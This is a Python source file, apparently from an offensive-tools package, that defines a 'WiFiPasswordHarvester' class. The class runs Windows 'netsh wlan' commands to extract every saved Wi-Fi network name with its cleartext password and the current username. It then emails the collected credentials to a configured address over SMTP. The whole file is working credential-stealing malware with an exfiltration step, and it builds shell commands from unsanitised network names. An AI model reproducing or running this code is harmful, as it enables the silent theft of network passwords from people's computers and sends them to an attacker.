from pyhtools.evil_files.malwares.utils import send_mail
import subprocess
import re


class WiFiPasswordHarvester:
    def __init__(self, email: str, passwd: str, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587) -> None:
        # smtp conf
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port

        # login details
        self.email = email
        self.passwd = passwd

    def get_credentials(self) -> str:
        '''
        returns wifi credentials as str
        '''
        def get_username():
            '''
            returns username if detected else returns "Unkown User"
            '''
            username = subprocess.check_output('whoami', shell=True).decode()
            if username:
                return username
            else:
                return 'Unknown User'

        command = 'netsh wlan show profiles'
        networks = subprocess.check_output(command, shell=True).decode()
        network_names = re.findall(r'(?:Profile\s*:\s)(.*)', networks)

        overall_nw_data = f'Subject: Received Credentials from {get_username()} \n'
        ssid_passwds = 'SSID : Password\n'
        for network_name in network_names:
            if 'QuantumRegion' in network_name:
                continue

            network_name = network_name.replace('\r', '')
            command = 'netsh wlan show profile "' + \
                (network_name) + '" key=clear'

            nw_info = subprocess.check_output(command, shell=True).decode()
            overall_nw_data += nw_info

            passwd_res = re.search(r'(?:Key\sContent\s*:\s)(.*)', nw_info)
            passwd = passwd_res.group(1)

            ssid_passwds += f'{network_name} : {passwd}\n'

        overall_nw_data += ssid_passwds
        return overall_nw_data

    def start(self):
        credentials = self.get_credentials()
        if credentials:
            if send_mail(self.email, self.email, self.passwd, credentials, self.smtp_server, self.smtp_port):
                print('[*] Process Completed Successfully')
                return True
        else:
            print('[-] Process Failed.')
            return False
